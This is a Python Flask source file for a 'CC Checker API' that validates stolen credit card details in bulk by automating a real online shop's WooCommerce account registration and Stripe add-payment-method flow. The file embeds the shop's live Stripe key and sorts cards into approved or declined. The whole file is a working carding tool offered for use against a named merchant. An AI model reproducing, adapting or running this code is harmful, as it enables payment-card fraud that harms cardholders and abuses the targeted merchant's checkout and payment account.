from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import random
import re
import asyncio
import time
from fake_useragent import UserAgent

app = Flask(__name__)
CORS(app)

# ==================== HELPER FUNCTIONS ====================

def gets(s, start, end):
    """Extract text between two strings"""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def get_between(text, start, end):
    """Alternative extractor with better error handling"""
    try:
        pattern = re.compile(re.escape(start) + '(.*?)' + re.escape(end), re.DOTALL)
        match = pattern.search(text)
        if match:
            return match.group(1)
        return None
    except:
        return None

async def get_random_info():
    """Generate random email and user"""
    return {
        "email": f"user{random.randint(100000, 999999)}@gmail.com",
        "username": f"user{random.randint(100000, 999999)}"
    }

# ==================== MAIN CHECK FUNCTION ====================

async def check_cc(fullz):
    """
    Check a single credit card
    Format: card_number|month|year|cvv
    """
    try:
        # Parse card details
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano
        
        # Generate random user info
        random_data = await get_random_info()
        email = random_data["email"]
        user = random_data["username"]

        # Create session with proper headers
        s = requests.Session()
        
        # Set default headers for all requests
        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # ============ STEP 1: Get Registration Nonce ============
        headers = {
            **default_headers,
            'Referer': 'https://radio-tecs.com/',
        }

        print(f"🔍 Getting registration page for {cc[:6]}****{cc[-4:]}")
        response = s.get('https://radio-tecs.com/my-account-2/', headers=headers, timeout=30)
        
        # Check if response is valid
        if response.status_code != 200:
            return {"status": "error", "message": f"Website returned status: {response.status_code}"}
        
        # Try multiple methods to get nonce
        nonce = None
        
        # Method 1: Using gets function
        nonce = gets(response.text, 
                    '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', 
                    '" />')
        
        # Method 2: Using regex
        if not nonce:
            nonce = get_between(response.text, 
                               'name="woocommerce-register-nonce" value="', 
                               '"')
        
        # Method 3: Search in entire page
        if not nonce:
            pattern = r'woocommerce-register-nonce" value="([^"]+)"'
            match = re.search(pattern, response.text)
            if match:
                nonce = match.group(1)
        
        if not nonce:
            print(f"❌ Nonce not found. Response length: {len(response.text)}")
            return {"status": "error", "message": "Failed to get registration nonce"}

        print(f"✅ Nonce found: {nonce[:20]}...")

        # ============ STEP 2: Register Account ============
        headers = {
            **default_headers,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://radio-tecs.com',
            'Referer': 'https://radio-tecs.com/my-account-2/',
        }

        data = {
            'username': user,
            'email': email,
            'mailpoet[subscribe_on_register_active]': '1',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://radio-tecs.com/',
            'wc_order_attribution_session_start_time': '2025-08-29 09:50:42',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }

        print(f"📝 Registering user: {user}")
        response = s.post('https://radio-tecs.com/my-account-2/', headers=headers, data=data, timeout=30)

        # Check if registration was successful
        if "register" in response.text.lower() and "error" in response.text.lower():
            return {"status": "error", "message": "Registration failed - account may exist"}

        # ============ STEP 3: Go to Payment Methods ============
        headers = {
            **default_headers,
            'Referer': 'https://radio-tecs.com/my-account-2/',
        }

        print(f"🔍 Getting payment methods page")
        response = s.get('https://radio-tecs.com/my-account-2/payment-methods/', headers=headers, timeout=30)

        # ============ STEP 4: Get Add Payment Method Page ============
        headers = {
            **default_headers,
            'Referer': 'https://radio-tecs.com/my-account-2/payment-methods/',
        }

        print(f"🔍 Getting add payment method page")
        response = s.get('https://radio-tecs.com/my-account-2/add-payment-method/', headers=headers, timeout=30)
        
        # Get payment nonce
        pnonce = None
        
        # Try multiple methods
        pnonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')
        
        if not pnonce:
            pnonce = get_between(response.text, 'createAndConfirmSetupIntentNonce":"', '"')
        
        if not pnonce:
            pattern = r'createAndConfirmSetupIntentNonce":"([^"]+)"'
            match = re.search(pattern, response.text)
            if match:
                pnonce = match.group(1)
        
        if not pnonce:
            return {"status": "error", "message": "Failed to get payment nonce"}

        print(f"✅ Payment nonce found")

        # ============ STEP 5: Create Payment Method on Stripe ============
        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
        }

        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/e837b000d9; stripe-js-v3/e837b000d9; payment-element; deferred-intent',
            'referrer': 'https://radio-tecs.com',
            'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
            '_stripe_version': '2024-06-20',
        }

        print(f"💳 Creating payment method for {cc[:6]}****{cc[-4:]}")
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        
        if response.status_code != 200:
            return {"status": "error", "message": f"Stripe API Error: {response.status_code}"}

        try:
            payment_id = response.json()['id']
        except:
            return {"status": "error", "message": "Failed to get payment ID from Stripe"}

        print(f"✅ Payment method created: {payment_id[:10]}...")

        # ============ STEP 6: Confirm Setup Intent ============
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://radio-tecs.com',
            'Referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'is_woopay_preflight_check': '0',
            'payment_method': payment_id,
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': pnonce,
        }

        print(f"✅ Confirming setup intent")
        response = s.post('https://radio-tecs.com/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)
        
        # ============ STEP 7: Parse Result ============
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    return {
                        "status": "approved", 
                        "message": "Card is valid and approved"
                    }
                else:
                    error_data = result.get('data', {})
                    if isinstance(error_data, dict) and 'error' in error_data:
                        error_msg = error_data['error'].get('message', 'Unknown error')
                    else:
                        error_msg = result.get('data', {}).get('message', 'Unknown error')
                    return {
                        "status": "declined", 
                        "message": error_msg
                    }
            except json.JSONDecodeError:
                if response.text.strip() == '0':
                    return {
                        "status": "declined", 
                        "message": "Nonce verification failed"
                    }
                elif 'error' in response.text.lower():
                    return {
                        "status": "declined", 
                        "message": response.text[:100]
                    }
                else:
                    return {
                        "status": "unknown", 
                        "message": response.text[:100]
                    }
        else:
            return {
                "status": "error", 
                "message": f"HTTP Error: {response.status_code}"
            }

    except Exception as e:
        return {
            "status": "error", 
            "message": str(e)
        }

# ==================== FLASK API ENDPOINTS ====================

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "service": "CC Checker API",
        "version": "3.1",
        "description": "Check credit cards via Stripe",
        "endpoints": {
            "/check": {
                "GET": "/check?cc=CARD",
                "POST": "JSON with card or cards"
            },
            "/health": "GET - Health check"
        }
    })

@app.route('/check', methods=['GET', 'POST'])
def check_cards():
    """Unified endpoint for GET and POST requests"""
    
    # GET Request
    if request.method == 'GET':
        cc = request.args.get('cc')
        
        if not cc:
            return jsonify({
                "status": "error",
                "message": "Missing 'cc' parameter",
                "example": "/check?cc=4106210007965080|08|2029|130"
            }), 400
        
        if "|" not in cc or len(cc.split("|")) != 4:
            return jsonify({
                "status": "error",
                "message": "Invalid format. Use: number|month|year|cvv",
                "example": "4106210007965080|08|2029|130"
            }), 400
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(check_cc(cc))
            loop.close()
            
            return jsonify({
                "type": "single",
                "card": cc,
                "result": result,
                "timestamp": time.time()
            })
            
        except Exception as e:
            return jsonify({
                "status": "error",
                "message": f"Server error: {str(e)}"
            }), 500
    
    # POST Request
    elif request.method == 'POST':
        try:
            data = request.get_json()
            
            if not data:
                return jsonify({"status": "error", "message": "No JSON data"}), 400
            
            # Single card
            if 'card' in data:
                card = data['card']
                
                if "|" not in card or len(card.split("|")) != 4:
                    return jsonify({
                        "status": "error",
                        "message": "Invalid format. Use: number|month|year|cvv"
                    }), 400
                
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(check_cc(card))
                loop.close()
                
                return jsonify({
                    "type": "single",
                    "card": card,
                    "result": result,
                    "timestamp": time.time()
                })
            
            # Bulk cards
            elif 'cards' in data:
                cards = data['cards']
                
                if not isinstance(cards, list) or len(cards) == 0:
                    return jsonify({"status": "error", "message": "Invalid cards array"}), 400
                
                results = []
                for card in cards[:50]:  # Max 50 cards
                    if "|" not in card or len(card.split("|")) != 4:
                        results.append({
                            "card": card,
                            "result": {"status": "error", "message": "Invalid format"}
                        })
                        continue
                    
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    result = loop.run_until_complete(check_cc(card))
                    loop.close()
                    
                    results.append({"card": card, "result": result})
                
                return jsonify({
                    "type": "bulk",
                    "total": len(results),
                    "results": results,
                    "timestamp": time.time()
                })
            
            else:
                return jsonify({
                    "status": "error",
                    "message": "Send 'card' or 'cards' in request",
                    "example": {"card": "4106210007965080|08|2029|130"}
                }), 400
                
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "version": "3.1",
        "timestamp": time.time()
    })

if __name__ == '__main__':
    print("=" * 50)
    print("🔥 CC Checker API v3.1")
    print("=" * 50)
    print("GET:  /check?cc=4106210007965080|08|2029|130")
    print("POST: /check with JSON body")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000, debug=True)